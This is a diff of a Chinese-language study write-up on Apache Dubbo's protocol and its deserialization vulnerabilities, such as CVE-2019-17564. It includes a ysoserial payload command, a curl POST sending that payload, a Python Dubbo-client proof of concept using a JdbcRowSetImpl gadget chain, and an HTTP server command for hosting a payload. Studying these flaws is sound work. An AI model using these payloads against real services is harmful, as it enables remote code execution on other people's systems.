@@ -2,9 +2,7 @@
 
 Apache Dubbo是一款阿里巴巴开源的轻量、高性能的Java RPC框架
 
-* 面向接口的远程方法调用
-* 智能容错、负载均衡
-* 服务自动注册和发现
+随着微服务的盛行，除开服务调用之外，Dubbo也逐渐涉猎服务治理、服务监控、服务网关等，往Spring Cloud靠拢。
 
 Dubbo RPC支持多种序列化方式：dubbo、hessian2、kryo、fastjson、java
 
@@ -45,7 +43,7 @@ Dubbo RPC支持多种序列化方式：dubbo、hessian2、kryo、fastjson、java
    * 2Way：标记是否期望从服务器返回值（1 bit）
    * Event：标记是否是事件消息（1bit）
    * Serialization ID：序列化类型（`Hessian2`、`Kryo`、`Java`）（5bits）
-3. 一个状态字节（status）：Req/Res=0时有效，标识响应状态（8 bits）
+3. 一个状态字节（status）：Req/Res=0时有效（即返回包），标识响应状态（8 bits）
 4. Request ID：标识唯一请求（64bits 8bytes）
 5. Data Length：序列化后的内容长度 (32 bits 4bytes)
 
@@ -67,15 +65,16 @@ Variable Part：序列化后的内容
 
 看一下`Dubbo`如何解析数据流的
 
-`org.apache.dubbo.rpc.protocol.dubbo#decode`=> `ExchangeCodec#decode`
+`org.apache.dubbo.rpc.protocol.dubbo.DubboCountCodec#decode` => `ExchangeCodec#decode`
 
 ![image-20230415152317973](../.gitbook/assets/image-20230415152317973.png)
 
 头字段校验通过后，开始解析整段数据流，有几个常量用于提取flag字节的每个位
 
-* FLAG_REQUEST 0x80  -128 1000 0000
-* FLAG_TWOWAY  0x40   64  0100 0000
-* FLAG_EVENT    0x20   32    0010 0000
+* FLAG_REQUEST 0x80  -128  1000 0000
+* FLAG_TWOWAY  0x40   64   0100 0000
+* FLAG_EVENT   0x20   32   0010 0000
+* SERIALIZATION_MASK 0x1F 31  0001 1111
 
 ![image-20230415154639352](../.gitbook/assets/image-20230415154639352.png)
 
@@ -83,11 +82,25 @@ Variable Part：序列化后的内容
 
 # 0x02 Quick Start
 
+学习文档：[基于 Dubbo API 开发微服务应用 | Apache Dubbo](https://cn.dubbo.apache.org/zh-cn/overview/quickstart/java/api/)
+
+![image-20231023095159869](./../.gitbook/assets/image-20231023095159869.png)
+
 Dubbo的注册中心官方推荐使用`Zookeeper`，默认端口2181
+
+通过注册中心，服务消费者可以感知到服务提供者的连接方式，从而将请求发送给正确的服务提供者。
 
 下载👉[Apache ZooKeeper](https://zookeeper.apache.org/releases.html)
 
-学习文档：[基于 Dubbo API 开发微服务应用 | Apache Dubbo](https://cn.dubbo.apache.org/zh-cn/overview/quickstart/java/api/)
+`conf`下有一个`zoo_sample.cfg`配置文件，复制一份并改名为`zoo.cfg`才能生效
+
+`Windows`系统到`bin`下面直接使用`zkServer.cmd`命令启动
+
+## 3.x
+
+直接跟着官方文档做
+
+## 2.x
 
 2.x版本基于配置文件：
 
@@ -192,7 +205,7 @@ dubbo-consumer.xml：
 
 # 0x03 Attack On Dubbo
 
-## Ⅰ. Httpinvoker Deser Without Security Check
+## Ⅰ. HttpInvoker Deser Without Security Check
 
 🚩**CVE-2019-17564**
 
@@ -205,7 +218,7 @@ dubbo-consumer.xml：
 
 📍漏洞点：`Dubbo`使用http协议时，`Apache Dubbo`直接使用了Spring框架的`org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter`类做远程调用，而这个过程会读取POST请求的Body并进行反序列化，最终导致漏洞。
 
-`Spring HTTP invoker` 是 Spring 框架中的一个远程调用模型，执行基于 HTTP 的远程调用
+`Spring HTTP invoker` 是Spring框架中的一个远程调用模型，执行基于HTTP的远程调用
 
 在Spring文档中，对`HttpInvokerServiceExporter`有如下描述，并不建议使用：
 
@@ -213,11 +226,9 @@ dubbo-consumer.xml：
 
 2.7.5后Dubbo使用`com.googlecode.jsonrpc4j.JsonRpcServer`替换了`HttpInvokerServiceExporter`。
 
-注：`Dubbo3`开始Http协议已经不再内嵌在`Dubbo`中，需要单独引入独立的模块。官方提供的样例👉`git clone https://github.com/apache/dubbo-samples.git`现在已经没有`dubbo-sample-http`🌿👊
+> 注：`Dubbo3`开始Http协议已经不再内嵌在`Dubbo`中，需要单独引入独立的模块。官方提供的样例👉`git clone https://github.com/apache/dubbo-samples.git`现在已经没有`dubbo-sample-http`🌿👊
 
-（🤯搭环境快疯了，dubbo本身的依赖`httpinvoker`，`org.springframework.remoting.httpinvoker`找不到呀，真离谱自身的依赖都没附一起🤮，加个`spring-web`依赖就有了。原本试图修改样例中`dubbo`整合的`spring boot`，但`maven`中央仓库的`dubbo-spring-boot-starter`最早的版本是`2.x`，里面也是没有`httpinvoker`，怕又有啥兼容问题就放弃了。。。）
-
-`provider.xml`
+`provider.xml`，指定了`dubbo:protocol`为`http`协议，否则默认为`dubbo`协议
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -245,79 +256,69 @@ dubbo-consumer.xml：
 ```
 
 ```xml
-<dependency>
-    <groupId>commons-collections</groupId>
-    <artifactId>commons-collections</artifactId>
-    <version>3.2.1</version>
-</dependency>
-<dependency>
-    <groupId>org.apache.dubbo</groupId>
-    <artifactId>dubbo</artifactId>
-    <version>2.7.3</version>
-</dependency>
-<dependency>
-    <groupId>org.springframework</groupId>
-    <artifactId>spring-web</artifactId>
-    <version>4.3.16.RELEASE</version>
-</dependency>
-<dependency>
-    <groupId>org.slf4j</groupId>
-    <artifactId>slf4j-api</artifactId>
-    <version>1.7.30</version>
-</dependency>
-<dependency>
-    <groupId>org.apache.curator</groupId>
-    <artifactId>curator-framework</artifactId>
-    <version>2.8.0</version>
-</dependency>
-<dependency>
-    <groupId>org.apache.curator</groupId>
-    <artifactId>curator-recipes</artifactId>
-    <version>2.8.0</version>
-</dependency>
-
-<!--http协议支持-->
-<dependency>
-    <groupId>javax.servlet</groupId>
-    <artifactId>javax.servlet-api</artifactId>
-    <version>4.0.1</version>
-</dependency>
-<dependency>
-    <groupId>org.apache.tomcat</groupId>
-    <artifactId>tomcat-catalina</artifactId>
-    <version>9.0.20</version>
-</dependency>
-<dependency>
-    <groupId>org.eclipse.jetty</groupId>
-    <artifactId>jetty-server</artifactId>
-    <version>9.4.14.v20181114</version>
-</dependency>
-<dependency>
-    <groupId>org.eclipse.jetty</groupId>
-    <artifactId>jetty-servlet</artifactId>
-    <version>9.4.14.v20181114</version>
-</dependency>
-<dependency>
-    <groupId>com.github.briandilley.jsonrpc4j</groupId>
-    <artifactId>jsonrpc4j</artifactId>
-    <version>1.2.0</version>
-</dependency>
+<dependencies>
+    <dependency>
+        <groupId>commons-collections</groupId>
+        <artifactId>commons-collections</artifactId>
+        <version>3.2.1</version>
+    </dependency>
+    <dependency>
+        <groupId>org.apache.dubbo</groupId>
+        <artifactId>dubbo</artifactId>
+        <version>2.7.3</version>
+    </dependency>
+    <dependency>
+        <groupId>org.springframework</groupId>
+        <artifactId>spring-web</artifactId>
+        <version>4.3.16.RELEASE</version>
+    </dependency>
+    <dependency>
+        <groupId>org.slf4j</groupId>
+        <artifactId>slf4j-api</artifactId>
+        <version>1.7.30</version>
+    </dependency>
+    <dependency>
+        <groupId>org.apache.curator</groupId>
+        <artifactId>curator-framework</artifactId>
+        <version>2.8.0</version>
+    </dependency>
+    <dependency>
+        <groupId>org.apache.curator</groupId>
+        <artifactId>curator-recipes</artifactId>
+        <version>2.8.0</version>
+    </dependency>
+    <dependency>
+        <groupId>org.eclipse.jetty</groupId>
+        <artifactId>jetty-server</artifactId>
+        <version>9.4.14.v20181114</version>
+    </dependency>
+    <dependency>
+        <groupId>org.eclipse.jetty</groupId>
+        <artifactId>jetty-servlet</artifactId>
+        <version>9.4.14.v20181114</version>
+    </dependency>
+</dependencies>
 ```
 
-好了，可以开心地复现了🖖（vulhub上有这个环境，可以docker拉取把环境里的jar包拿出来放本地调试）
+（vulhub上有这个环境，可以docker拉取把环境里的jar包拿出来放本地调试）
 
 > java -jar ysoserial.jar CommonsCollections6 "calc" > 1.poc
+>
 > curl -XPOST --data-binary @1.poc http://127.0.0.1:8666/demo.DemoService
 
 `org.apache.dubbo.remoting.http.servlet.DispatcherServlet#service`，跟`SpringMVC`的`DispatcherServlet`类似，根据访问URL决定交给哪个`handler`处理
 
 ![image-20230413202112942](../.gitbook/assets/image-20230413202112942.png)
 
-`skeletonMap`获取`url`对应`HttpInvokerServiceExporter`，跟进`skeleton.handleRequest`
+`skeletonMap`获取`url`对应skeleton，这里的skeleton就是`Spring Web`提供的危险类`org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter`
+
+限制了只能是POST请求
 
 ![image-20230413202315103](../.gitbook/assets/image-20230413202315103.png)
 
-`readRemoteInvocation`即读取远程调用信息，也就是我们传过来的参数
+`skeleton.handleRequest` -> `readRemoteInvocation` 即读取远程调用信息，也就是我们传过来的数据。
+
+根据这个类的描述`Deserialize a RemoteInvocation object from the given InputStream.`可知道接下来要对输入流进行反序列化了。这里也创建了一个`ObjectInputStream`对象了。
 
 ![image-20230413202726879](../.gitbook/assets/image-20230413202726879.png)
 
@@ -325,8 +326,11 @@ dubbo-consumer.xml：
 
 ![image-20230413202840372](../.gitbook/assets/image-20230413202840372.png)
 
-> 若报错`java.io.StreamCorruptedException: invalid stream header: FFFE08E1`，删掉`1.poc`，重新执行一遍`ysoserial`（我貌似执行了两遍）
+> windows下powershell使用`ysoserial`生成payload会导致数据变化，换成cmd就正常了。否则反序列化的时候会报错
 >
+> `java.io.StreamCorruptedException: invalid stream header: FFFE08E1`
+>
+> 正常的原生序列化头部应该是`AC ED 00 05`
 
 高版本放弃了`HttpInvokerServiceExporter`，而是采用`JsonRpcServer`，该类没有进行反序列化的危险操作
 
@@ -351,52 +355,58 @@ dubbo-consumer.xml：
 
 📍漏洞点：Dubbo服务端不会对客户端传入的调用服务名及参数进行检查，即使在服务端未找到对应的服务名，也会对客户端传入的参数进行反序列化操作
 
-Dubbo默认使用的还是`Hessian`协议
+Dubbo默认使用的还是`Hessian`反序列化。
 
-用官方给的SpringBoot样例👉 https://github.com/apache/dubbo-samples
-
-（🤯又是环境问题，`dubbo-spring-boot-starter 2.7.3`没有`@DubboService`注解，换成`@Service`就好了；`DubboReference`同理）
+（如果用的`Spring-Boot`搭建，`dubbo-spring-boot-starter 2.7.3`没有`@DubboService`注解，换成`@Service`就好了；`DubboReference`同理）
 
 先来看看`Dubbo Provider`接收到请求后的处理流程是咋样的
 
-`org.apache.dubbo.remoting.transport.DecodeHandler#received`
+书接上文，dubbo协议头部校验通过后，对整块输入流进行解析，封装了一个`DecodeableRpcInvocation`对象来解码调用（`decode`）
 
-对`message`类型进行判断，发现是`Request`消息，`getData`获取`Decodeable`数据进行解码`decode`
+![image-20231023150108525](./../.gitbook/assets/image-20231023150108525.png)
 
-![image-20230414172004917](../.gitbook/assets/image-20230414172004917.png)
+根据dubbo协议头的序列化标记位决定使用哪种序列化方式。
 
-`org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation#decode`
+![image-20231023134349078](./../.gitbook/assets/image-20231023134349078.png)
 
-又跳到另一个重载的`decode`方法，根据请求输入流创建了一个`Hessian2ObjectInput`，读取了一些基本信息
+Dubbo支持的序列化方法还挺多的，包括`Gson`、`FastJson`、`Hessian`、`Kryo`、`Fst`
 
-* `Dubbo`协议版本 （dubboVersion：2.5.3）
-* 请求的服务路径  （path：com.evil）
-* 远程调用的方法名  （setMethodName）
-* 远程调用的方法参数类型 （desc：Lcom/rometools/rome/feed/impl/ToStringBean;）
+默认的序列化方式为`Hessian`
 
-![image-20230414172233016](../.gitbook/assets/image-20230414172233016.png)
+![image-20231023135241145](./../.gitbook/assets/image-20231023135241145.png)
 
-`ServiceRepository#lookupService(path)`根据请求的服务路径去查找暴露的服务接口，红框中是我们自定义提供的服务，若查找成功返回一个`ServiceDescriptor`对象。
+`Hessian2Serialization#deserialize`实例化了一个`Hessian2ObjectInput`返回
 
-![image-20230414173642039](../.gitbook/assets/image-20230414173642039.png)
+接着从输入流读取如下内容：
 
-显然并不存在我们请求的服务，但它继续解析下去了，开始用`Hessian2ObjectInput`反序列化我们请求传递的参数
+* `Dubbo`协议版本 （dubboVersion：`3.7.6`）
+* 请求的服务路径  （path：`demo.DemoService`）
+* 远程调用的方法名  （setMethodName：`sayHi`）
+* 远程调用的方法参数类型 （desc：`Ljava/lang/String;`）
 
-![image-20230414173349059](../.gitbook/assets/image-20230414173349059.png)
+![image-20231023155059991](./../.gitbook/assets/image-20231023155059991.png)
 
-接着到了`com.alibaba.com.caucho.hessian.io.Hessian2Input`，注意看这个包不是`caucho`的了
+从`ServiceRepository`查找是否存在要调用的服务，并获取服务方法对应的参数类型和返回类型。
 
-因为阿里魔改了`Hessian`，但主要逻辑没变，还是熟悉的味道。
+![image-20231023155434814](./../.gitbook/assets/image-20231023155434814.png)
 
-`Hessian`反序列化时是先得到类的实例对象，然后获取`Fields`，再通过反射注入到实例对象中
+如果没有找到对应的服务，把从输入流读入的参数类型赋给`pts`
 
-`Dubbo`下的`Hessian`默认的反序列化器是`JavaDeserializer`，获取类的实例对象是通过调用类的构造器来实例化对象的，从`JavaDeserializer`构造方法中发现，会选择最少参数的构造器。但是传入的参数为空，导致某些类实例化时会抛出空指针异常。
+找不到服务理应退出函数、抛出异常等处理，但它继续解析下去了，根据参数类型对参数进行反序列化（这里是`Hessian2ObjectInput#readObject(Class<?> cl)`）
 
-（`Dubbo` 貌似删掉了`Hessian`原本的默认反序列化器`UnsafeDeserializer`，`JavaDeserializer`限制太大了）
+![image-20231023155643966](./../.gitbook/assets/image-20231023155643966.png)
 
-熟悉的`readObjectInstance`
+接着到了`org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectInput#readObject`，注意看这个包不是`caucho`的了
 
-![image-20230414190115004](../.gitbook/assets/image-20230414190115004.png)
+阿里魔改了`Hessian`，但主要逻辑没变，还是熟悉的味道。
+
+![image-20231024135907587](./../.gitbook/assets/image-20231024135907587.png)
+
+`Dubbo`下的`Hessian`删掉了`UnsafeDeserializer`，将`JavaDeserializer`作为默认的反序列化器
+
+![image-20231023160102886](./../.gitbook/assets/image-20231023160102886.png)
+
+`JavaDeserializer`获取类的实例对象是通过调用类的构造器来实例化对象的，从`JavaDeserializer`构造方法中发现，会选择参数和其权重最小的构造器。再通过反射给实例对象赋值。
 
 `JavaDeserializer#readObject` 先实例化对象再反射赋值
 
@@ -426,9 +436,7 @@ public class JavaDeserializer extends AbstractMapDeserializer {
 
             for (int i = 0; i < fieldNames.length; i++) {
                 String name = fieldNames[i];
-
                 FieldDeserializer deser = (FieldDeserializer) _fieldMap.get(name);
-
                 if (deser != null)
                     deser.deserialize(in, obj);
                 else
@@ -436,7 +444,6 @@ public class JavaDeserializer extends AbstractMapDeserializer {
             }
 
             Object resolve = resolve(obj);
-
             return resolve;
         } // .....
     }
@@ -447,21 +454,20 @@ public class JavaDeserializer extends AbstractMapDeserializer {
             if (_readResolve != null)
                 return _readResolve.invoke(obj, new Object[0]);
         } // ....
-
         return obj;
     }
 }
 ```
 
-到这开始分界，有两种利用方式，下面一一分析
+反序列化得到对象后，有两种利用方式，见下
 
-### Strategy1: Exported Service Not Found -> toString
+### Exported Service Not Found -> toString
 
 回到``org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation#decode`` -> `decodeInvocationArgument`
 
 ![image-20230414192214426](../.gitbook/assets/image-20230414192214426.png)
 
-如果当前传输的是一个回调函数，那么 `Dubbo` 会在客户端创建一个代理对象，并将代理对象传输给服务端。在服务端调用回调函数时，会将回调函数的代理对象传输回客户端，并通过代理对象来调用客户端的回调函数接口。在这个过程中，`Dubbo` 需要从通道中获取 URL 和环境等信息，并将其用于反序列化和执行回调函数。回调函数机制可以让服务端通过回调函数的代理对象来调用客户端的回调函数接口，实现双向通信。
+如果当前传输的是一个回调函数，那么 `Dubbo` 会在客户端创建一个代理对象，并将代理对象传输给服务端。在服务端调用回调函数时，会将回调函数的代理对象传输回客户端，并通过代理对象来调用客户端的回调函数接口。在这个过程中，`Dubbo` 需要从channel中获取 URL 和环境等信息，并将其用于反序列化和执行回调函数。回调函数机制可以让服务端通过回调函数的代理对象来调用客户端的回调函数接口，实现双向通信。
 
 ![image-20230414194508085](../.gitbook/assets/image-20230414194508085.png)
 
@@ -519,7 +525,7 @@ print(resp)
 >
 > python -m http.server 8000
 
-### Strategy2:  deserialize params anyway
+### Hessian deserialization
 
 上面是利用找不到服务抛出异常，打印异常信息时触发了`toString`
 
@@ -527,9 +533,9 @@ print(resp)
 
 `MapDeserializer#readMap`会进行`map.put`操作，进而触发`key.hashCode()`
 
-> 😭踩坑记录：
+> 踩坑记录：
 >
-> 🕒还是上面说的`Dubbo`默认反序列化器`JavaDeserializer`的问题。
+> 🕒Dubbo`默认反序列化器`JavaDeserializer`的问题。
 >
 > 之前Rome利用链里加了`ObjectBean`（`ObjectBean`是多余的），其构造器会初始化`equalsBean`，`new EqualsBean(beanClass, obj);`，而传入的参数都是`null`，`EqualsBean`这个构造器会抛出`NullPointer`异常
 >
@@ -617,7 +623,7 @@ public static boolean isEcho(String path, String method) {
 
 把POC中的方法名修改一下就能打了
 ```python
-from dubbo.codec.hessian2 import Decoder, new_object
+from dubbo.codec.hessian2 import new_object
 from dubbo.client import DubboClient
 
 client = DubboClient('127.0.0.1', 20880)
@@ -632,9 +638,9 @@ JdbcRowSetImplClass = new_object(
     name="com.sun.rowset.JdbcRowSetImpl",
 )
 toStringBean = new_object(
-    'com.rometools.rome.feed.impl.ToStringBean',
-    beanClass=JdbcRowSetImplClass,
-    obj=JdbcRowSetImpl
+    'com.sun.syndication.feed.impl.ToStringBean',
+    _beanClass=JdbcRowSetImplClass,
+    _obj=JdbcRowSetImpl
 )
 
 resp = client.send_request_and_return_response(
@@ -781,16 +787,6 @@ Bytes.long2bytes(new Random().nextInt(100000000), header, 4);   // Request ID 8�
 ![image-20230415161220246](../.gitbook/assets/image-20230415161220246.png)
 
 但上面的`expect String 2 readObject`仍可以打，`2.7.13`前的都可以打
-
-### CVE-2021-30179
-
-影响：
-
-Apache Dubbo 2.7.0 to 2.7.9
-
-Apache Dubbo 2.6.0 to 2.6.9
-
-上面讲到``org.apache.dubbo.remoting.transport.DecodeHandler#received``对`message`进行解析之后（`Request`则找到对应方法并反序列化参数），进入`handler.received`
 
 ## Ⅲ. Consumer Specified Deserialization
 
@@ -975,7 +971,7 @@ public class Attack {
 }
 ```
 
-> 😭踩坑记录：
+> 踩坑记录：
 >
 > 上面的POC没触发成功，刚开始还以为是端口问题，一点反应都没有
 >
@@ -988,64 +984,6 @@ public class Attack {
 > 发现`buffer`有个`maxLength`属性等于2048
 >
 > payload超出buffer，需要缩短payload
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-# Kryo反序列化
-
-`Dubbo`协议依靠标志字节（流的第三个字节）来决定使用哪个`deserializer `来处理流，虽然默认是`Hessian2`，但是针对`Hessian2`序列化格式的对象传输可能会有黑白名单设置的限制。攻击者可以修改`flag`位来选择`FST Serialization`或`Kryo Serialization`
-
-
-
-# Beef
-
-太菜了，`Dubbo`反序列化来来回回断断续续搞了一个礼拜，中间踩了很多坑，幸好自己坚持看下去并解决了问题
-
-复现漏洞能学到什么呢？
-
-* 一个框架或组件的设计方式
-* 融会贯通这个框架下依赖的其他框架或组件的漏洞
-* 一些利用和绕过姿势
-* 漏洞修复
-* ~~增强自信心~~
 
 # Reference
 
